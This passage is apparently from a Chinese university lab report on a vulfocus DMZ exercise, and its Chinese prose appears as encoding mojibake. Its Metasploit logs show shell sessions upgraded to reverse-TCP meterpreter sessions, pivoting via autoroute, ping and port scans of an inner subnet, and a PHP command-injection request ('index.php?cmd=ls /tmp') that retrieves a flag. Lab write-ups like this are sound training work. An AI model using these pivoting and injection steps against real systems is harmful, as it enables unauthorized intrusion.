å‰©ä¸‹çš„å°±æ˜¯åˆ†åˆ«åœ¨3ä¸ªä¼šè¯ä¸­`ls /tmp`æŸ¥çœ‹flagæäº¤äº†ï¼Œè¿™é‡Œä¸å†èµ˜è¿°

#### å†…å±‚

ä»ç„¶å’Œä¸­å±‚ä¸€æ ·éœ€è¦æ‰¾åˆ°è·³æ¿ä¸»æœºè®¿é—®åˆ°å†…å±‚ç½‘ç»œï¼Œé€šè¿‡å‡çº§æ™®é€šä¼šè¯åˆ°meterpreterï¼Œéšåæ­å»ºautorouteæ·»åŠ è·¯ç”±è¡¨ï¼Œéšåè¿›è¡Œå­˜æ´»æ€§æ‰«æï¼Œå†è€…æ˜¯ç«¯å£æ‰«æï¼Œè¯ä¸å¤šè¯´ç›´æ¥æ“ä½œå§

é¦–å…ˆæ˜¯å‡çº§ä¼šè¯å’Œæ‰¾åˆ°è¿æ¥å†…å±‚ç½‘ç»œçš„è·³æ¿ä¸»æœºï¼Œè¿™é‡Œå› ä¸ºå¼€å¤ªå¤šå®¹å™¨å’Œè™šæ‹Ÿæœºçš„é—®é¢˜å›è¿é€Ÿåº¦ç•¥æ…¢å¯¼è‡´äº§ç”Ÿäº†æŠ¥é”™ï¼Œå³å‰ä¸€ä¼šè¯ä»åœ¨ç­‰å¾…4433ç«¯å£çš„å›åº”æ—¶ä¸‹ä¸€ä¼šè¯çš„payloadå·²ç»å‘é€è¿‡å»å¯¼è‡´æœ¬åœ°ç«¯å£å†²çªäº†ï¼Œä¸è¿‡ä¸å½±å“ï¼Œä½¿ç”¨`jobs -l`ç¡®è®¤åå°æ‰§è¡Œå®Œæˆå3ä¸ªä¼šè¯éƒ½å‡çº§åˆ°äº†meterpreterï¼š

```metasploit
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -u 3-5
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [3, 4, 5]

[*] Upgrading session ID: 3
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.56.107:4433
[*] Sending stage (1017704 bytes) to 192.168.56.1
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Sleeping 5 seconds to allow the previous handler to finish..
[*] Upgrading session ID: 4
[*] Starting exploit/multi/handler
[-] Job 1 is listening on IP 192.168.56.107 and port 4433
[-] A job is listening on the same local port
[-] Failed to start exploit/multi/handler on 4433, it may be in use by another process.
[*] Sleeping 5 seconds to allow the previous handler to finish..
[*] Upgrading session ID: 5
[*] Starting exploit/multi/handler
[-] Job 1 is listening on IP 192.168.56.107 and port 4433
[-] A job is listening on the same local port
[-] Failed to start exploit/multi/handler on 4433, it may be in use by another process.
[*] Sleeping 5 seconds to allow the previous handler to finish..
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > [*] Meterpreter session 6 opened (192.168.56.107:4433 -> 192.168.56.1:60622) at 2023-07-26 11:08:53 -0400

[*] Stopping exploit/multi/handler

msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions

Active sessions
===============

  Id  Name  Type                   Information          Connection
  --  ----  ----                   -----------          ----------
  1         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60604 (172.29.108.146)
  2         meterpreter x86/linux  root @ 192.171.84.4  192.168.56.107:4433 -> 192.168.56.1:60598 (172.29.108.146)
  3         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60640 (192.171.84.2)
  4         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60630 (192.171.84.3)
  5         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60574 (192.171.84.5)
  6         meterpreter x86/linux  root @ 192.171.84.2  192.168.56.107:4433 -> 192.168.56.1:60622 (192.171.84.2)

msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -i 6
[*] Starting interaction with 6...

meterpreter > ipconfig

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0


Interface 35
============
Name         : eth0
Hardware MAC : 02:42:c0:ab:54:02
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.171.84.2
IPv4 Netmask : 255.255.255.0

meterpreter > background
[*] Backgrounding session 6...
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -u 4
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [4]

[*] Upgrading session ID: 4
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.56.107:4433
[*] Sending stage (1017704 bytes) to 192.168.56.1
[*] Command stager progress: 100.00% (773/773 bytes)
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -u 5
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [5]

[*] Upgrading session ID: 5
[*] Starting exploit/multi/handler
[-] Job 2 is listening on IP 192.168.56.107 and port 4433
[-] A job is listening on the same local port
[-] Failed to start exploit/multi/handler on 4433, it may be in use by another process.
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > jobs -l

Jobs
====

  Id  Name                    Payload                            Payload opts
  --  ----                    -------                            ------------
  2   Exploit: multi/handler  linux/x86/meterpreter/reverse_tcp  tcp://192.168.56.107:4433

msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > [*] Meterpreter session 7 opened (192.168.56.107:4433 -> 192.168.56.1:60618) at 2023-07-26 11:10:35 -0400

[*] Stopping exploit/multi/handler

msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -u 5
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [5]

[*] Upgrading session ID: 5
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.56.107:4433
[*] Sending stage (1017704 bytes) to 192.168.56.1
[*] Command stager progress: 100.00% (773/773 bytes)
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > jobs[*] Meterpreter session 8 opened (192.168.56.107:4433 -> 192.168.56.1:60638) at 2023-07-26 11:11:01 -0400

[*] Stopping exploit/multi/handler
jobs -l

Jobs
====

No active jobs.

msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions

Active sessions
===============

  Id  Name  Type                   Information          Connection
  --  ----  ----                   -----------          ----------
  1         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60604 (172.29.108.146)
  2         meterpreter x86/linux  root @ 192.171.84.4  192.168.56.107:4433 -> 192.168.56.1:60598 (172.29.108.146)
  3         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60640 (192.171.84.2)
  4         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60630 (192.171.84.3)
  5         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60574 (192.171.84.5)
  6         meterpreter x86/linux  root @ 192.171.84.2  192.168.56.107:4433 -> 192.168.56.1:60622 (192.171.84.2)
  7         meterpreter x86/linux  root @ 192.171.84.3  192.168.56.107:4433 -> 192.168.56.1:60618 (192.171.84.3)
  8         meterpreter x86/linux  root @ 192.172.85.3  192.168.56.107:4433 -> 192.168.56.1:60638 (192.171.84.5)

msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) >
```

ç”±äºå·²ç»éªŒè¯è¿‡6å·ä¼šè¯å¹¶ä¸æ˜¯æ‹¥æœ‰åŒç½‘å¡çš„ç›®æ ‡è·³æ¿ä¸»æœºï¼Œå‰©ä¸‹çš„å°±æ˜¯å¯¹7å·å’Œ8å·ä¼šè¯è¿›è¡Œç¡®è®¤ï¼Œç¡®è®¤åˆ°8å·ä¼šè¯æ²¡æœ‰é—®é¢˜åå›åˆ°msfconsoleæ‰§è¡Œautorouteçš„æ¨¡å—æ·»åŠ é€šè¿‡8å·ä¼šè¯çš„è·¯ç”±è½¬å‘è§„åˆ™ï¼Œæ­¤æ—¶å°±å¯ä»¥ç›´æ¥åœ¨msfconsoleé€šè¿‡ping_sweepå’Œportscan/tcpæ¥ç›´æ¥è¿›è¡Œæ‰«æäº†ï¼š

```metasploit
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -i 7
[*] Starting interaction with 7...

meterpreter > ipconfig

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0


Interface 41
============
Name         : eth0
Hardware MAC : 02:42:c0:ab:54:03
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.171.84.3
IPv4 Netmask : 255.255.255.0

meterpreter > background
[*] Backgrounding session 7...
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -i 8
[*] Starting interaction with 8...

meterpreter > ipconfig

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0


Interface 39
============
Name         : eth0
Hardware MAC : 02:42:c0:ac:55:03
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.172.85.3
IPv4 Netmask : 255.255.255.0


Interface 45
============
Name         : eth1
Hardware MAC : 02:42:c0:ab:54:05
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.171.84.5
IPv4 Netmask : 255.255.255.0

meterpreter > background
[*] Backgrounding session 8...
msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > search autoroute

Matching Modules
================

   #  Name                         Disclosure Date  Rank    Check  Description
   -  ----                         ---------------  ----    -----  -----------
   0  post/multi/manage/autoroute                   normal  No     Multi Manage Network Route via Meterpreter Session


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/autoroute

msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > use 0
msf6 post(multi/manage/autoroute) > options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION  2                yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)


View the full module info with the info, or info -d command.

msf6 post(multi/manage/autoroute) > set session 8
session => 8
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 192.172.85.3
[*] Searching for subnets to autoroute.
[+] Route added to subnet 192.172.85.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
msf6 post(multi/manage/autoroute) > route

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.171.84.0       255.255.255.0      Session 2
   192.172.85.0       255.255.255.0      Session 8

[*] There are currently no IPv6 routes defined.
msf6 post(multi/manage/autoroute) >
```

é€šè¿‡ping_sweepå¯ä»¥å‘ç°åˆ°å­˜æ´»ä¸»æœºçš„åœ°å€ï¼ˆæ‰å‘ç°ping_sweepæ˜¯æ”¯æŒç›´æ¥é€‰æ‹©ä¼šè¯å·æ¥é€‰æ‹©ä¸»æœºæ‰§è¡Œæ‰«æçš„ï¼Œä¸è¿‡æ—¢ç„¶åé¢çš„TCPç«¯å£æ‰«æå¹¶æ²¡æœ‰è¿™ä¹ˆæ™ºèƒ½ï¼Œå°±ä¸è¿›è¡Œç‰¹åˆ«è¯´æ˜äº†ï¼‰ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç®€å•çš„ç«¯å£æ‰«æäº†ï¼Œç”±äºå·²çŸ¥æ˜¯Nginxåç§°è€Œç›´æ¥æ‰«æ80ç«¯å£åº”è¯¥ä¸ä¼šæœ‰é—®é¢˜çš„å§ï¼š

```metasploit
msf6 post(multi/manage/autoroute) > search ping_sweep

Matching Modules
================

   #  Name                          Disclosure Date  Rank    Check  Description
   -  ----                          ---------------  ----    -----  -----------
   0  post/multi/gather/ping_sweep                   normal  No     Multi Gather Ping Sweep


Interact with a module by name or index. For example info 0, use 0 or use post/multi/gather/ping_sweep

msf6 post(multi/manage/autoroute) > use 0
msf6 post(multi/gather/ping_sweep) > options

Module options (post/multi/gather/ping_sweep):

   Name     Current Setting   Required  Description
   ----     ---------------   --------  -----------
   RHOSTS   192.171.84.2-254  yes       IP Range to perform ping sweep against.
   SESSION  2                 yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(multi/gather/ping_sweep) > set rhosts 192.172.85.2-254
rhosts => 192.172.85.2-254
msf6 post(multi/gather/ping_sweep) > set session 8
session => 8
msf6 post(multi/gather/ping_sweep) > run

[*] Performing ping sweep for IP range 192.172.85.2-254
[+]     192.172.85.2 host found
[+]     192.172.85.3 host found
[*] Post module execution completed
msf6 post(multi/gather/ping_sweep) > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access

msf6 post(multi/gather/ping_sweep) > use 5
msf6 auxiliary(scanner/portscan/tcp) > options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in millisecon
                                           ds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS       192.171.84.2-5   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
                                           asics/using-metasploit.html
   THREADS      4096             yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/portscan/tcp) > set ports 80
ports => 80
msf6 auxiliary(scanner/portscan/tcp) > set rhosts 192.172.85.2-3
rhosts => 192.172.85.2-3
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 192.172.85.2:         - 192.172.85.2:80 - TCP OPEN
[*] 192.172.85.2-3:       - Scanned 2 of 2 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/tcp) >
```

ç„¶åè¯´åˆ°æ¼æ´è¿™éƒ¨åˆ†ï¼Œæœ€å†…å±‚çš„è¿™å°ä¸»æœºçš„æ¼æ´æ¯”è¾ƒå¥‡ç‰¹ï¼Œæ²¡æœ‰CVEç¼–å·ï¼Œåªæ˜¯ä¸€ä¸ªç”¨æ¥æ¼”ç¤ºphpä¼ å‚ç›´æ¥å¯ä»¥å®ç°ä»£ç æ‰§è¡Œçš„æ¼æ´ï¼Œä»è¯¾ç¨‹è§†é¢‘ä¸­çš„æ¼”ç¤ºä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œé€»è¾‘ä¸Šåªæ˜¯éœ€è¦é€šè¿‡æ„é€ GETè¯·æ±‚ï¼Œé€šè¿‡ä¼ å‚ç»™`index.php`å®ç°ç›´æ¥è®©é¡µé¢å›æ˜¾'ls /tmp'çš„å†…å®¹ï¼Œæƒ³è¦åƒæ ·ä¸€ç‚¹çš„æ“ä½œçš„è¯è¿™éƒ¨åˆ†å¯ä»¥é€šè¿‡BurpSuiteæ¥å®ç°çš„

å½“ç„¶è¯¾ç¨‹è§†é¢‘ä¸­çš„å®ç°æ–¹å¼æ›´ä¸ºç›´æ¥ï¼Œé€šè¿‡è·³æ¿ä¸»æœºçš„shellï¼Œç”¨wgetç›´æ¥å‘é€è¯·æ±‚ï¼Œè¿™é‡Œä¹Ÿä¸æ‰“ç®—æŠ˜è…¾åœ¨Metasploitå¤–éƒ¨é¢å¤–é…ç½®è·¯ç”±è½¬å‘ä»£ç†ï¼Œå§‘ä¸”å°±æŒ‰ç…§è§†é¢‘ä¸­æ¼”ç¤ºçš„æ–¹å¼æ‰§è¡Œå°±å¥½ï¼ˆä¸­é—´ä¸å°å¿ƒå¤šæ‰“äº†ä¸€ä¸ªå›è½¦å¯¼è‡´ä¸€ç‚¹é—®é¢˜ï¼Œä¸è¿‡æ— ä¼¤å¤§é›…å°±æ˜¯äº†ï¼‰ï¼š

```metasploit
msf6 auxiliary(scanner/portscan/tcp) > sessions -i 8
[*] Starting interaction with 8...

meterpreter > shell
Process 628 created.
Channel 256 created.
which wget
/usr/bin/wget
wget '192.172.85.2' -O /tmp/z && cat /tmp/z
--2023-07-26 15:47:10--  http://192.172.85.2/
Connecting to 192.172.85.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: '/tmp/z'

     0K                                                        2.60M=0s

2023-07-26 15:47:10 (2.60 MB/s) - '/tmp/z' saved [21]

index.php?cmd=ls /tmp
wget '
192.172.85.2/index.php?cmd=ls /tmp' -O /tmp/zz && cat /tmp/zz
--2023-07-26 15:47:53--  http://%0A192.172.85.2/index.php?cmd=ls%20/tmp
Resolving \n192.172.85.2 (\n192.172.85.2)... failed: Name or service not known.
wget: unable to resolve host address '\n192.172.85.2'
wget '192.172.85.2/index.php?cmd=ls /tmp' -O /tmp/zz && cat /tmp/zz
--2023-07-26 15:48:07--  http://192.172.85.2/index.php?cmd=ls%20/tmp
Connecting to 192.172.85.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: '/tmp/zz'

     0K                                                        9.73M=0s

2023-07-26 15:48:07 (9.73 MB/s) - '/tmp/zz' saved [68]

index.php?cmd=ls /tmpflag-{bmh6813cff7-ad78-49c7-8ee1-6f4b7629c640}
^Z
Background channel 256? [y/N]  y
meterpreter > background
[*] Backgrounding session 8...
msf6 auxiliary(scanner/portscan/tcp) >
```

è‡³æ­¤ï¼Œæ•´ä¸ªDMZä¸»æœºç¯å¢ƒå°±ç®—æ˜¯ä»å¤–å±‚åˆ°ä¸­å±‚å†åˆ°å†…å±‚éƒ½æ‹¿ä¸‹äº†

### è“æ–¹æ“ä½œ

## é—®é¢˜è®°å½•

### è§£å†³çš„é—®é¢˜

#### vulfocuså¹³å°ä¸å†æ”¯æŒä¸ªäººæ­å»ºçš„å¹³å°è®¿é—®åœºæ™¯å•†åº—

æœ€æ—©æ˜¯rockå‘ç°äº†è¿™ä¸€é—®é¢˜ï¼Œä¸ºäº†ç¡®è®¤ä¸æ˜¯ä¸ªäººåŸå› ï¼Œæˆ‘ä¹Ÿå¿«é€Ÿè¿›è¡Œäº†vulfocuså¹³å°çš„æ­å»ºï¼Œå‘ç°ç¡®å®åº”è¯¥æ˜¯å¹³å°å®˜æ–¹ä¸å†å¼€æ”¾åœºæ™¯å•†åº—ç»™ä¸ªäººæ­å»ºå¹³å°çš„æ„Ÿè§‰ï¼Œè€ƒè™‘åˆ°æœåŠ¡å™¨æˆæœ¬æˆ–è€…æ”»å‡»ä¿æŠ¤ç­‰ç­‰åŸå› ä¹Ÿæ˜¯å¯ä»¥æ¥å—

rocké‚£è¾¹ç”šè‡³æ‰¾åˆ°äº†vulfocusçš„åœ¨çº¿å¹³å°ï¼Œå‘ç°è™½ç„¶å¯ä»¥åœ¨å®˜æ–¹çš„åœ¨çº¿å¹³å°ä¸Šæ‰“å¼€åœºæ™¯å•†åº—ï¼Œåœºæ™¯å´ä¸å¼€æ”¾æ‰“åŒ…ä¸‹è½½çš„åŠŸèƒ½ï¼Œrockæ„¤ç„¶ç•™è¨€è¦æ±‚å¼€æ”¾åœºæ™¯ä¸‹è½½ï¼Œç”šè‡³è¿˜åŠ äº†å¼€å‘è€…çš„å¾®ä¿¡ç¾¤æƒ³è¦è®¨ä¸ªè¯´æ³•ğŸ˜‚æœ€åä¹Ÿæ˜¯æ²¡ä»€ä¹ˆä¸‹æ–‡

äºæ˜¯æˆ‘è¿™è¾¹å’Œrockå°è¯•äº†æ‰‹æ“è¿™ä¸ªæ€è·¯ï¼Œè¯¾ç¨‹è§†é¢‘ä¸­æ­£å¥½å¯¹æ•´ä¸ªDMZç¯å¢ƒçš„åœºæ™¯æœ‰è®²è§£ï¼Œäºæ˜¯å°±è¯•ç€ä»åˆ›å»ºç½‘å¡å¼€å§‹æ‘¸ç´¢ï¼Œåˆ°å‚ç…§é•œåƒé€‰æ‹©æ­å»ºäº†æ‰‹æ“çš„DMZåœºæ™¯å‡ºæ¥ï¼Œå¹¶ä¸”â€œä¼¼ä¹â€ä¹Ÿæ²¡æœ‰é‡åˆ°å¤ªå¤šé—®é¢˜ï¼Œå°±è¿™ä¹ˆç»§ç»­é¡ºç€æ‰‹æ“çš„DMZåœºæ™¯åšä¸‹å»äº†ï¼ˆ[ä¼ç¬”](#è–›å®šè°”çš„å®¹å™¨)ï¼‰

![screenShot](./img/2023-07-12-175824.png)

æœ€åä¹Ÿæ˜¯rockåœ¨è®¨è®ºåŒºå‘å¸ƒäº†[å”¯ä¸€çš„ä¸€ç¯‡å¸–å­](http://courses.cuc.edu.cn/course/109860/forum?show_sidebar=false#/topics/457749)ï¼ˆé“¾æ¥å¯èƒ½éœ€è¦è®¿é—®æƒé™ï¼‰ï¼Œæˆ‘åˆ™æ˜¯å¯¹å…¶ä¸­â€œå› ä¸ºå°è¯•è€Œè¯¯å¯¹å¤–å¼€æ”¾äº†å…¨éƒ¨ä¸»æœºâ€çš„é—®é¢˜è¿›è¡Œäº†ä¿®æ­£ï¼Œå³è¦æ¨¡æ‹Ÿä»…æœ€å¤–å±‚ä¸»æœºä½œä¸ºå…¥å£ï¼Œå†…ç½‘ä¸»æœºå¯¹å¤–â€œéšèº«â€

#### è–›å®šè°”çš„å®¹å™¨ï¼Ÿ

ä¸”è¯´ä¸Šä¸€éƒ¨åˆ†è®¨è®ºæ‰‹æ“DMZåœºæ™¯è¿™ä»¶äº‹ï¼Œè™½ç„¶è¯´æŠ„äº†ä¸ªå¤§æ¦‚ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘è¿™è¾¹æœ€å†…å±‚çš„Nginxå‘½ä»¤æ‰§è¡Œæ¼æ´çš„å®¹å™¨ä¼šå‡ºç°æŠ¥é”™é€€å‡ºçš„æƒ…å†µï¼Œåˆ†æä¸‹æ¥æ„Ÿè§‰åƒæ˜¯vulfocuså¹³å°è®¾è®¡çš„ç½‘å¡ä¹‹é—´ç½‘æ®µåˆ†é…çš„é—®é¢˜ï¼Ÿæˆªå›¾æ¥çœ‹æ˜¯ä¸‹é¢çš„æ•ˆæœï¼š

![screenShot](./img/2023-07-18-181813.png)

ä¸ºäº†æ’è¿™éƒ¨åˆ†é”™ï¼Œæˆ‘ç”šè‡³å°è¯•äº†æ¸…é™¤æ‰€æœ‰å®¹å™¨ã€é•œåƒã€ç½‘å¡ç­‰ï¼š

```bash
docker system prune -a
```

ç„¶åæ˜¯é‡æ–°ä¸‹è½½vulfocuså¹³å°çš„é•œåƒï¼Œç¯å¢ƒä¸­ç”¨åˆ°çš„åŒ…å«æ¼æ´çš„é•œåƒä¹Ÿå°½æ•°é‡æ–°ä¸‹è½½ï¼Œç„¶è€Œå¹¶æ²¡æœ‰è§£å†³é—®é¢˜ï¼Œæ²¡æœ‰å˜çš„æ˜¯ç½‘æ®µåˆ†é…è¿˜æ˜¯å­˜åœ¨é—®é¢˜ï¼Œå³åœ°å€å¹¶æ²¡æœ‰æŒ‰ç…§åœ¨å¹³å°ä¸­å®šä¹‰çš„è™šæ‹Ÿç½‘å¡é‚£æ ·åˆ†é…ç½‘æ®µ

ç›´åˆ°åˆéš”äº†ä¸€é˜µå­ï¼Œå¼€å§‹è‚æŠ¥å‘Šäº†ï¼Œå°è¯•å¤ç°è¿™éƒ¨åˆ†å†…å®¹ï¼Œä¸€åˆ‡åˆæ­£å¸¸äº†ï¼Œä¹‹å‰è¿è¡Œå°±ä¼šé€€å‡ºçš„Nginxå‘½ä»¤æ‰§è¡Œæ¼æ´å®¹å™¨è¿™æ¬¡ä¹Ÿæ­£å¸¸è¿è¡Œäº†ï¼š

```bash
â”Œâ”€â”€(leafã‰¿ZephyrusG15)-[~/Downloads/ctf-games/fofapro/vulfocus]
â””â”€$ dk ps -a
CONTAINER ID   IMAGE                                    COMMAND                  CREATED         STATUS
   PORTS                                         NAMES
1f9e1717645c   vulfocus/struts2-cve_2020_17530:latest   "/usr/local/bin/mvn-â€¦"   8 minutes ago   Up 8 minutes
   0.0.0.0:63469->8080/tcp, :::63469->8080/tcp   8f439cea-c7ac-4e71-a8b3-e4f96d9c2654_jslmf51ua1c_1
3384d7e6a302   vulfocus/weblogic-cve_2019_2725:latest   "startWebLogic.sh"       8 minutes ago   Up 8 minutes
   5556/tcp, 7001/tcp                            8f439cea-c7ac-4e71-a8b3-e4f96d9c2654_12zwznv9dp68_1
a11c919b9c58   vulfocus/weblogic-cve_2019_2725:latest   "startWebLogic.sh"       8 minutes ago   Up 8 minutes
   5556/tcp, 7001/tcp                            8f439cea-c7ac-4e71-a8b3-e4f96d9c2654_3ysq230jk8w0_1
61c7669ba129   vulshare/nginx-php-flag:latest           "/2.sh"                  8 minutes ago   Up 8 minutes
   80/tcp                                        8f439cea-c7ac-4e71-a8b3-e4f96d9c2654_5bmsr0nf7b00_1
996a93042bb9   vulfocus/weblogic-cve_2019_2725:latest   "startWebLogic.sh"       8 minutes ago   Up 8 minutes
   5556/tcp, 7001/tcp                            8f439cea-c7ac-4e71-a8b3-e4f96d9c2654_3z99kgcz8km0_1
f1ea333cc299   vulfocus/vulfocus:latest                 "sh /vulfocus-api/ruâ€¦"   3 hours ago     Up 3 hours (healthy)      0.0.0.0:80->80/tcp, :::80->80/tcp             vulfocus_vul-focus_1
25a25352d04e   vulfocus/weblogic-cve_2019_2725:latest   "startWebLogic.sh"       7 days ago      Exited (137) 6 days ago                                                 9c3103b1-30f6-4b88-ac91-f35e2c3ca060_12zwznv9dp68_1
70ce52c49a2b   vulfocus/weblogic-cve_2019_2725:latest   "startWebLogic.sh"       7 days ago      Exited (137) 6 days ago                                                 9c3103b1-30f6-4b88-ac91-f35e2c3ca060_3z99kgcz8km0_1
0c67ad8c14fa   vulfocus/struts2-cve_2020_17530:latest   "/usr/local/bin/mvn-â€¦"   7 days ago      Exited (143) 6 days ago                                                 9c3103b1-30f6-4b88-ac91-f35e2c3ca060_jslmf51ua1c_1
9b451976a7c3   vulshare/nginx-php-flag:latest           "/2.sh"                  7 days ago      Exited (1) 7 days ago                                                   9c3103b1-30f6-4b88-ac91-f35e2c3ca060_5bmsr0nf7b00_1
68b81f757d9c   vulfocus/weblogic-cve_2019_2725:latest   "startWebLogic.sh"       7 days ago      Exited (137) 6 days ago                                                 9c3103b1-30f6-4b88-ac91-f35e2c3ca060_3ysq230jk8w0_1

â”Œâ”€â”€(leafã‰¿ZephyrusG15)-[~/Downloads/ctf-games/fofapro/vulfocus]
â””â”€$
```

ä¹Ÿå¯¼è‡´å†™äº†ä¸€åŠçš„æŠ¥å‘Šéœ€è¦æ‰”ä¸‹å†å›è¿‡å¤´å»å®Œæˆæœ€åä¸€å°æœºå™¨çš„flagæäº¤ğŸ˜”

ï¼ˆå°å£°ï¼šè¿™éƒ¨åˆ†åŸæœ¬æ˜¯æ”¾åœ¨â€œæœªè§£å†³çš„é—®é¢˜â€ä¸‹çš„ï¼Œäº‹å‡ºçªç„¶ç”šè‡³æ‰“ä¹±äº†æˆ‘çš„æŠ¥å‘Šæ ¼å¼ğŸ˜¡ï¼‰

### ç¥ç§˜çš„æ—¥è®°

[è¿™æ˜¯ä»€ä¹ˆï¼Ÿ](./diary.md)

## å‚è€ƒé“¾æ¥

- [ç½‘ç»œå®‰å…¨(2021) ç»¼åˆå®éªŒ_å“”å“©å“”å“©_bilibili](https://www.bilibili.com/video/BV1p3411x7da/)

- [ç½‘ç»œå®‰å…¨](https://c4pr1c3.github.io/cuc-ns-ppt/vuls-awd.md.v4.html#/title-slide)

- [How To Remove Docker Images, Containers, and Volumes | DigitalOcean](https://www.digitalocean.com/community/tutorials/how-to-remove-docker-images-containers-and-volumes)

- [Struts2 S2-061 Remote Code Execution Vulnerability (CVE-2020-17530) Threat Alert - NSFOCUS, Inc., a global network and cyber security leader, protects enterprises and carriers from advanced cyber attacks.](https://nsfocusglobal.com/struts2-s2-061-remote-code-execution-vulnerability-cve-2020-17530-threat-alert/)
